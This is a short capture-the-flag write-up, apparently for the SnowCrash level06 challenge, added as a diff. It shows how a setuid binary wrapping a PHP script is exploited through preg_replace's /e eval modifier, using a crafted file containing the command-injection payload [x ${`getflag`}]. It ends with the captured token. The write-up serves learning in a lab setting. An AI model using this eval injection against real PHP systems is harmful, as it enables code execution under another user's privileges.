@@ -1,0 +1,29 @@
+List home file
+	-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
+	-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
+
+We try ./level06
+	-> PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
+	-> this command launch level06.php 
+
+strings level06 | grep uid
+	-> setresuid
+	-> geteuid
+	-> se assume this program is executed as flag06 like level03
+
+We open level06.php to find an injection
+	-> it opens file as param
+	-> preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+	-> option /e is eval, this option is deprecated after php version 5.5 (https://www.php.net/manual/fr/function.preg-replace.php)
+
+level06@SnowCrash:~$ php -v
+PHP 5.3.10-1ubuntu3.19 with Suhosin-Patch (cli) (built: Jul  2 2015 15:05:54)
+	-> injection shoulds work
+
+We create a file to pass as param /tmp/flag06
+	-> content : [x ${`getflag`}]
+	-> ${`getflag`} will be "evaluated" by php executed as flag06 user
+
+level06@SnowCrash:~$ ./level06 /tmp/flag06
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
